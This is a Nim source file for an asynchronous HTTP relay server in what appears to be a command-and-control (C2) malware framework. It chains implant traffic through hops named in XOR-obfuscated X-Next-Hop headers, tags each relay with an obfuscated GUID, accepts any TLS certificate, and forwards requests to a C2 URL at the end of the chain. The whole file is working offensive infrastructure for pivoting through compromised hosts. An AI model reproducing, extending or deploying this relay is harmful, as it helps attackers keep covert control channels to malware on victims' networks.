#[
    HTTP Relay Server - Async HTTP Server
    Forwards HTTP requests with X-Next-Hop header
    When chain ends, forwards directly to C2
]#

import asyncdispatch, asynchttpserver, strutils, base64, puppy
import ../util/crypto
import ../config/configParser

const INITIAL_XOR_KEY {.intdefine.}: int = 459457925

# Decrypt X-Next-Hop header (encrypted with INITIAL_XOR_KEY)
proc decryptNextHop*(encrypted: string): string =
    try:
        let decoded = base64.decode(encrypted)
        result = xorString(decoded, INITIAL_XOR_KEY)
        when defined debug:
            echo "[RELAY] 🔓 Decrypted X-Next-Hop: " & result
    except:
        when defined debug:
            echo "[RELAY] ❌ Failed to decrypt X-Next-Hop"
        result = ""

# Encrypt next hop chain for X-Next-Hop header
proc encryptNextHop*(hopChain: string): string =
    let xored = xorString(hopChain, INITIAL_XOR_KEY)
    result = base64.encode(xored)

# Pop first hop from chain, return (firstHop, remainingHops)
proc popNextHop*(hopChain: string): (string, string) =
    if "," in hopChain:
        let parts = hopChain.split(",")
        result = (parts[0], parts[1..^1].join(","))
    else:
        result = (hopChain, "")

# Encrypt relay GUID for X-Relay-GUID header
proc encryptRelayGuid(guid: string): string =
    let xored = xorString(guid, INITIAL_XOR_KEY)
    result = base64.encode(xored)

# Async HTTP relay server
# parentAddr: Immediate parent relay (host:port), empty if this is top relay
# c2Url: Full C2 URL (e.g., "https://example.replit.dev:443"), only for top relay
proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "", c2Url: string = "") {.async.} =
    when defined debug:
        echo "[RELAY] 🚀 Starting async HTTP relay server on port " & $port
        if parentAddr != "":
            echo "[RELAY] 🔗 Parent relay: " & parentAddr
        if c2Url != "":
            echo "[RELAY] 🎯 C2 target: " & c2Url
    
    var server = newAsyncHttpServer()
    
    proc handleRequest(req: asynchttpserver.Request): Future[void] {.async, gcsafe.} =
        when defined debug:
            echo "[RELAY] 🔌 " & $req.reqMethod & " " & req.url.path & " from " & req.hostname
        
        try:
            # Extract X-Next-Hop header
            var nextHopHeader = ""
            if req.headers.hasKey("x-next-hop"):
                nextHopHeader = req.headers["x-next-hop"]
            elif req.headers.hasKey("X-Next-Hop"):
                nextHopHeader = req.headers["X-Next-Hop"]
            
            if nextHopHeader == "":
                when defined debug:
                    echo "[RELAY] ❌ Missing X-Next-Hop header"
                await req.respond(Http400, "Missing X-Next-Hop")
                return
            
            # Decrypt hop chain from client
            let hopChain = decryptNextHop(nextHopHeader)
            if hopChain == "":
                await req.respond(Http400, "Invalid X-Next-Hop")
                return
            
            when defined debug:
                echo "[RELAY] 📨 Client sent hop chain: " & hopChain
            
            # Pop first hop (should be us)
            let (firstHop, remainingHops) = popNextHop(hopChain)
            
            when defined debug:
                echo "[RELAY] 🔍 First hop: " & firstHop
                if remainingHops != "":
                    echo "[RELAY] 📝 Remaining after pop: " & remainingHops
                else:
                    echo "[RELAY] 📭 No remaining hops after pop"
            
            # Determine what to forward
            var targetUrl: string
            var fwdHeaders: seq[Header] = @[]
            var nextHopChain: string
            
            # If client provided remaining hops, use those
            if remainingHops != "":
                nextHopChain = remainingHops
                when defined debug:
                    echo "[RELAY] ✅ Using client's remaining hops: " & nextHopChain
            # Else if we have our own parent chain, use that
            elif parentAddr != "":
                nextHopChain = parentAddr
                when defined debug:
                    echo "[RELAY] 🔗 Client only knew up to us, using our parent chain: " & nextHopChain
            # Else forward to C2
            else:
                nextHopChain = ""
                when defined debug:
                    echo "[RELAY] 🎯 No parent chain, forwarding to C2"
            
            # Build target and headers based on next hop
            if nextHopChain != "":
                # Get first hop from chain
                let nextTarget = nextHopChain.split(",")[0]
                targetUrl = "http://" & nextTarget & req.url.path
                
                when defined debug:
                    echo "[RELAY] ↪️  Forwarding to next hop: " & targetUrl
                
                # Copy headers (exclude x-relay-guid to avoid accumulation)
                for key, value in req.headers.pairs:
                    let lowerKey = key.toLower()
                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
                        fwdHeaders.add(Header(key: key, value: value))
                
                # Set X-Next-Hop with the next chain
                fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(nextHopChain)))
                
                # Replace with our own X-Relay-GUID (identifies this relay to parent)
                if relayGuid != "":
                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
            else:
                # Forward to C2
                if c2Url == "":
                    when defined debug:
                        echo "[RELAY] ❌ No C2 URL configured"
                    await req.respond(Http500, "No C2 configured")
                    return
                
                targetUrl = c2Url & req.url.path
                when defined debug:
                    echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
                
                # Copy headers but remove X-Next-Hop and X-Relay-GUID
                for key, value in req.headers.pairs:
                    let lowerKey = key.toLower()
                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
                        fwdHeaders.add(Header(key: key, value: value))
                
                # Add our own X-Relay-GUID (identifies this relay to C2)
                if relayGuid != "":
                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
            
            when defined debug:
                echo "[RELAY] 📤 Sending request to: " & targetUrl
                echo "[RELAY] 📤 Method: " & $req.reqMethod
            
            # Use puppy for the request (same as rest of the codebase)
            let parsedUrl = parseUrl(targetUrl)
            
            # Preserve the original HTTP method
            let httpVerb = case req.reqMethod:
                of HttpGet: "get"
                of HttpPost: "post"
                of HttpPut: "put"
                of HttpDelete: "delete"
                of HttpHead: "head"
                of HttpPatch: "patch"
                else: "get"
            
            # Get request body if it exists (for POST, PUT, PATCH)
            var requestBody = ""
            if req.reqMethod in [HttpPost, HttpPut, HttpPatch]:
                requestBody = req.body
                when defined debug:
                    echo "[RELAY] 📦 Request body length: " & $requestBody.len
            
            let puppyReq = puppy.Request(
                url: parsedUrl,
                verb: httpVerb,
                headers: fwdHeaders,
                body: requestBody,
                allowAnyHttpsCertificate: true
            )
            
            let response = puppy.fetch(puppyReq)
            
            when defined debug:
                echo "[RELAY] 📥 Response: " & $response.code & " (" & $response.body.len & " bytes)"
            
            # Convert puppy headers to asynchttpserver headers
            var respHeaders = newHttpHeaders()
            for (key, value) in response.headers:
                respHeaders[key] = value
            
            # Forward response
            await req.respond(HttpCode(response.code), response.body, respHeaders)
            
        except Exception as e:
            when defined debug:
                echo "[RELAY] ❌ Error: " & e.msg
            try:
                await req.respond(Http502, "Relay error")
            except:
                discard
    
    when defined debug:
        echo "[RELAY] ✅ Listening on 0.0.0.0:" & $port
    
    await server.serve(Port(port), handleRequest)
